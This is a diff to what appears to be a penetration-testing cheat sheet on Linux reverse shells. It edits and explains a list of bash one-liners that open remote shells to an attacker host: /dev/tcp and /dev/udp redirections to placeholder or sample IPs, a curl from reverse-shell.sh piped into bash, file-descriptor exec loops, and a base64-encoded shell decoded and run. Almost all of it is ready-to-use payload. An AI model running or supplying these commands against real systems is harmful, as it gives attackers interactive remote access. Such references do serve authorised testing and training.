@@ -13,10 +13,11 @@
 ```bash
 curl https://reverse-shell.sh/1.1.1.1:3000 | bash
 bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
-sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
+bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
 exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
-#Short and bypass (cretdits to Dikline)
+
+#Short and bypass (credits to Dikline)
 (sh)0>/dev/tcp/10.10.10.10/9091
 #after getting the previous shell to get the output to execute
 exec >&0
@@ -34,6 +35,14 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
+
+#### Shell explanation
+
+1. **`bash -i`**: This part of the command starts an interactive (`-i`) Bash shell.
+2. **`>&`**: This part of the command is a shorthand notation for **redirecting both standard output** (`stdout`) and **standard error** (`stderr`) to the **same destination**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: This is a special file that **represents a TCP connection to the specified IP address and port**.&#x20;
+   * By **redirecting the output and error streams to this file**, the command effectively sends the output of the interactive shell session to the attacker's machine.
+4. **`0>&1`**: This part of the command **redirects standard input (`stdin`) to the same destination as standard output (`stdout`)**.&#x20;
 
 ### Create in file and execute
 
